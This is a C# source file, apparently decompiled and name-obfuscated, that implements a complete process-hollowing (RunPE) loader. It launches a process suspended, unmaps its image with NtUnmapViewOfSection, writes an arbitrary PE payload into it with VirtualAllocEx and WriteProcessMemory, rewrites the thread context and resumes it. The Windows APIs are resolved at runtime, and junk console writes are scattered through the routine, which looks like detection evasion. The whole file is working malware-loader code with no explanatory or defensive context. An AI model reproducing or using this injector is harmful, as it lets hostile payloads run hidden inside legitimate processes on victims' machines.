using System;
using System.Runtime.InteropServices;

internal sealed class Class1
{
	private delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, Enum0 enum0_0, IntPtr intptr_2, string string_2, ref Struct1 struct1_0, out Struct2 struct2_0);

	private delegate bool Delegate1(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, object object_0);

	private delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1);

	private delegate bool Delegate3(IntPtr intptr_0, ref Struct10 struct10_0);

	private delegate bool Delegate4(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, Enum3 enum3_0, Enum2 enum2_0);

	private delegate bool Delegate5(IntPtr intptr_0, [In] ref Struct10 struct10_0);

	private delegate uint Delegate6(IntPtr intptr_0);

	private enum Enum0 : uint
	{

	}

	private struct Struct0
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public byte[] byte_0;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_6;
	}

	private enum Enum1 : uint
	{

	}

	private enum Enum2 : uint
	{

	}

	private struct Struct1
	{
		public uint uint_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public short short_0;

		public short short_1;

		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public IntPtr intptr_2;

		public IntPtr intptr_3;
	}

	private enum Enum3 : uint
	{

	}

	private struct Struct2
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public uint uint_0;

		public uint uint_1;
	}

	private struct Struct3
	{
		public int int_0;

		public IntPtr intptr_0;

		public bool bool_0;
	}

	private struct Struct4
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public ushort ushort_7;

		public ushort ushort_8;

		public ushort ushort_9;

		public ushort ushort_10;

		public ushort ushort_11;

		public ushort ushort_12;

		public ushort ushort_13;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ushort_14;

		public ushort ushort_15;

		public ushort ushort_16;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ushort_17;

		public int int_0;
	}

	private struct Struct5
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public ushort ushort_2;

		public ushort ushort_3;
	}

	private struct Struct6
	{
		public uint uint_0;

		public uint uint_1;
	}

	private struct Struct7
	{
		public uint uint_0;

		public Struct5 struct5_0;

		public Struct8 struct8_0;
	}

	private struct Struct8
	{
		public ushort ushort_0;

		public byte byte_0;

		public byte byte_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public ushort ushort_7;

		public ushort ushort_8;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public Struct6[] struct6_0;
	}

	private struct Struct9
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] byte_0;

		public uint uint_7;
	}

	private struct Struct10
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public Struct9 struct9_0;

		public uint uint_7;

		public uint uint_8;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		public uint uint_19;

		public uint uint_20;

		public uint uint_21;

		public uint uint_22;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] byte_0;
	}

	private void method_0()
	{
		Console.Write("4th3l4lz");
	}

	[DllImport("kernel32")]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	[DllImport("kernel32")]
	private static extern IntPtr LoadLibrary(string string_0);

	public void method_1(byte[] byte_0, string string_0, string string_1)
	{
		Struct4 @struct = default(Struct4);
		Struct7 struct2 = default(Struct7);
		method_0();
		Struct0 struct3 = default(Struct0);
		Struct1 struct1_ = default(Struct1);
		method_0();
		Struct2 struct2_ = default(Struct2);
		Struct10 struct10_ = default(Struct10);
		method_0();
		int num = 0;
		struct1_.uint_0 = (uint)Marshal.SizeOf((object)struct1_);
		struct10_.uint_0 = 65543u;
		method_0();
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		num = gCHandle.AddrOfPinnedObject().ToInt32();
		method_0();
		gCHandle.Free();
		@struct = (Struct4)Marshal.PtrToStructure((IntPtr)num, typeof(Struct4));
		method_0();
		struct2 = (Struct7)Marshal.PtrToStructure((IntPtr)(num + @struct.int_0), typeof(Struct7));
		method_0();
		if (struct2.uint_0 != 17744 || @struct.ushort_0 != 23117)
		{
			return;
		}
		Delegate0 @delegate = (Delegate0)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("kernel32.dll"), "CreateProcessA"), typeof(Delegate0));
		Delegate2 delegate2 = (Delegate2)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("ntdll.dll"), "NtUnmapViewOfSection"), typeof(Delegate2));
		Delegate4 delegate3 = (Delegate4)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("kernel32.dll"), "VirtualAllocEx"), typeof(Delegate4));
		method_0();
		Delegate1 delegate4 = (Delegate1)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("kernel32.dll"), "WriteProcessMemory"), typeof(Delegate1));
		Delegate3 delegate5 = (Delegate3)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("kernel32.dll"), "GetThreadContext"), typeof(Delegate3));
		Delegate5 delegate6 = (Delegate5)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("kernel32.dll"), "SetThreadContext"), typeof(Delegate5));
		method_0();
		Delegate6 delegate7 = (Delegate6)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("kernel32.dll"), "ResumeThread"), typeof(Delegate6));
		method_0();
		@delegate(string_1, string_0, IntPtr.Zero, IntPtr.Zero, bool_0: false, (Enum0)4u, IntPtr.Zero, null, ref struct1_, out struct2_);
		delegate2(struct2_.intptr_0, (IntPtr)struct2.struct8_0.uint_6);
		method_0();
		if (!delegate3(struct2_.intptr_0, (IntPtr)struct2.struct8_0.uint_6, struct2.struct8_0.uint_10, (Enum3)12288u, (Enum2)64u))
		{
			return;
		}
		delegate4(struct2_.intptr_0, (IntPtr)struct2.struct8_0.uint_6, byte_0, struct2.struct8_0.uint_11, null);
		method_0();
		for (int i = 0; i <= struct2.struct5_0.ushort_1 - 1; i++)
		{
			struct3 = (Struct0)Marshal.PtrToStructure((IntPtr)(num + @struct.int_0 + Marshal.SizeOf((object)struct2) + Marshal.SizeOf((object)struct3) * i), typeof(Struct0));
			byte[] array = new byte[struct3.uint_2];
			for (int j = 0; j <= (int)(struct3.uint_2 - 1); j++)
			{
				array[j] = byte_0[struct3.uint_3 + j];
			}
			method_0();
			delegate4(struct2_.intptr_0, (IntPtr)(struct2.struct8_0.uint_6 + struct3.uint_1), array, struct3.uint_2, null);
		}
		delegate5(struct2_.intptr_1, ref struct10_);
		method_0();
		byte[] bytes = BitConverter.GetBytes(struct2.struct8_0.uint_6);
		delegate4(struct2_.intptr_0, (IntPtr)(struct10_.uint_13 + 8), bytes, (uint)bytes.Length, null);
		struct10_.uint_16 = struct2.struct8_0.uint_6 + struct2.struct8_0.uint_3;
		method_0();
		delegate6(struct2_.intptr_1, ref struct10_);
		delegate7(struct2_.intptr_1);
	}
}
